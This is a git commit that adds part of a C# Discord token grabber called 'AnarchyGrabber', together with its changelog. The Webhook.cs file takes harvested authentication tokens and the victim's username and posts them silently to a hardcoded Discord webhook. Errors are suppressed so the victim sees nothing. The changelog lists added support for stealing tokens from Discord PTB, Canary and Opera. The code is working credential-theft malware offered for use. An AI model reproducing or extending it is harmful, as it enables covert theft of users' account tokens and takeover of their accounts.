4689e84d45e150c33c4917d259f98366417156f8
LemonizDev <73875650+LemonizDev@users.noreply.github.com>
2021-10-08 13:23:54 +0530

    init commit

---
+++ AnarchyGrabber/Webhook.cs
@@ -0,0 +1,30 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Net.Http;
+
+namespace AnarchyGrabber
+{
+    public static class Webhook
+    {
+        //you've got to change this to your own discord webhook url
+        private static readonly string _hookUrl = "https://discordapp.com/api/webhooks/689596782618869845/vsXfyEVW59MNftcWtnrvDCKKHmcQPJ9HT0DF7KR5K4iyVv9IxvopfPWaU91Y5h_JHi7B";
+
+
+        public static void ReportTokens(List<string> tokenReport)
+        {
+            try
+            {
+                HttpClient client = new HttpClient();
+                Dictionary<string, string> contents = new Dictionary<string, string>
+                    {
+                        { "content", $"Token report for '{Environment.UserName}'\n\n{string.Join("\n", tokenReport)}" },
+                        { "username", "Anarchy Token Grabber" },
+                        { "avatar_url", "https://media.discordapp.net/attachments/601457544380022790/609824918028419082/Anarchy.png" }
+                    };
+
+                client.PostAsync(_hookUrl, new FormUrlEncodedContent(contents)).GetAwaiter().GetResult();
+            }
+            catch { }
+        }
+    }
+}
---
+++ Changelog.md
@@ -0,0 +1,8 @@
+# 0.0.2.0
+- Added support for 'Discord PTB', 'Opera' and 'Discord Canary'.
+- Made grabber not include services without tokens to the final report.
+- Made grabber remove duplicates.
+- Fixed a bug where the grabber would have problems recognizing the token.
+
+# 0.0.1.0
+- Initial release.
